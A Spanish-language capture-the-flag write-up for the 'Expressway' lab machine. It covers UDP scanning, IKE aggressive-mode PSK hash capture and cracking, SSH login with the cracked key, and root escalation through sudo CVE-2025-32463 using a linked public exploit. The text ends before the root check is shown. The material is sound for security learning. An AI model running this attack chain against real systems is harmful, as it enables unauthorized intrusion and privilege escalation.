# Expressway
<table>
  <tr>
    <td style="vertical-align: top; padding-right: 20px;">
      <img src="portadas/Expressway.png" alt="Expressway" style="max-width:320px; width:100%; height:auto;"/>
    </td>
    <td style="vertical-align: top; padding-left: 20px;">
      <strong>Vulnerabilidades / Características a tratar</strong>
      <ul>
        <li>IKE (Aggressive Mode) — PSK hash disclosure</li>
        <li>Weak/guessable PSK — PSK cracked via wordlist → Credential compromise</li>
        <li>SSH access obtained (usuario <code>ike</code>)</li>
        <li>Lista de servicios UDP relevantes (ISAKMP / IKE)</li>
        <li>Non-standard SUID binary: <code>/usr/local/bin/sudo</code> (version 1.9.17)</li>
        <li>Privilege Escalation vía CVE-2025-32463 (exploit publicado)</li>
      </ul>
    </td>
  </tr>
</table>
## Reconocimiento inicial
Primero lanzamos un escaneo básico de recnocimiento sobre el objetivo:


```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.245 -oG allports
```

```shell
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
```

Solo encontramos un puerto abierto por lo tanot vamos a comprobar si es vulnerable por la versión

```shell
nmap -sCV -p22 10.10.11.87 -oN targeted
```

Obtenemos que la versión es actual y no es vulnerable por lo tanto vamos a tener que hacer otro tipo de escaneo 
por UDP

```shell 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)

```

### Enumeración de los puertos UDP

De la misma manera hacemos un escaneo de los puertos más representativos de UDP para ello utilizamos el siguiente comando.

```shell
nmap -sU --top-ports 100 10.10.11.87 -oN udp_top100
```

Estos son los puertos interesante que nos encontramos que estan abierto o filtrados.

```shell
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike
```

Aquí lo importante es el puerto 500/udp (ISAKMP), que corresponde a IKE (Internet Key Exchange).

## IKE

IKE (Internet Key Exchange) es un protocolo usado en IPsec VPNs.
Funciona en el puerto 500/UDP y se encarga de negociar claves y parámetros de seguridad entre dos dispositivos que quieren montar un túnel VPN.

Existen dos modos principales:

- Main Mode

- Aggressive Mode (más rápido, pero menos seguro porque puede filtrar información como el identificador de usuario y hashes de PSK).

En esta máquina, el servicio estaba configurado en Aggressive Mode con autenticación por PSK (Pre-Shared Key) → esto es vulnerable a ataques de diccionario.

### Enumeración de IKE con (ike-scan)

Vamos a comprobar le modo Main
```shell
ike-scan -M 10.10.11.87
```
Recibimos la siguiente respuesta:
```shell
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Main Mode Handshake returned
        HDR=(CKY-R=86b87084be5796a2)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.068 seconds (14.71 hosts/sec).  1 returned handshake; 0 returned notify
```                                                                                             

Tambien vamos a probar la opción `-A` de Aggressive Mode

```shell
ike-scan -A 10.10.11.87
```
```shell
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=26cc3f02d2207e44) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.065 seconds (15.28 hosts/sec).  1 returned handshake; 0 returned notify
```

Como se puede apreciar el servicio revela un ID de usuario(ike@expressway.htb) y un hash del PSK

### Crackeo del PSK
Generamos un hash con el siguiente comando para posteriormente intentar averiguar que contiene.
```shell
ike-scan -A 10.10.11.87 --id=ike@expressway.htb --pskcrack=hash.txt
```
Con el comando de `psk-crack` intentamos obtner el valor del hash
```shell
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
```

Vemos que el resultado es la contraseña siguiente.

```shell
key "freakingrockstarontheroad"
```

## Intrusión a la máquina por SSH

Con el ID que encontramos (ike) y la PSK crackeada, podemos probar acceso vía SSH:
```shell
ssh ike@10.10.11.87
Contraseña: freakingrockstarontheroad
```
✅ Conseguimos acceso a la máquina como el usuario ike.


## Enumeración interna

Comprobamos si el usuario `ike`puede usar sudo

```shell
sudo -l
```
Obtenemos de resultado lo siguiente:

```shell
Sorry, user ike may not run sudo on expressway.
```

👉 No tiene permisos sudo.

Así que pasamos a buscar binarios SUID (que pueden darnos escalada de privilegios):
```shell
find / -perm -4000 -type f 2>/dev/null
```
Resultado interesante:
```shell
/usr/local/bin/sudo
```


👉 Un binario de sudo instalado en /usr/local/bin/, distinto al estándar del sistema.
Además, comprobamos su versión:

```shell
/usr/local/bin/sudo -V
```

Resultado:

```shell
Sudo version 1.9.17
```

## 8. Escalada de privilegios (CVE-2025-32463)

La versión sudo 1.9.17 tiene una vulnerabilidad crítica que permite escalar a root sin conocer credenciales si el binario es SUID (como en este caso).

Para explotarla, subimos a la máquina el exploit público cve-2025-32463.sh.

El exploit que he utilizado es el siguiente:

```shell
https://github.com/KaiHT-Ladiant/CVE-2025-32463/blob/main/cve-2025-32463.sh/
```

Para subir el exploit a la maquina he utilizado el siguiente comando:
```shell
scp cve-2025-32463.sh ike@10.10.11.87:/tmp/
```

Por último comprobamos que realmente somos usuario root.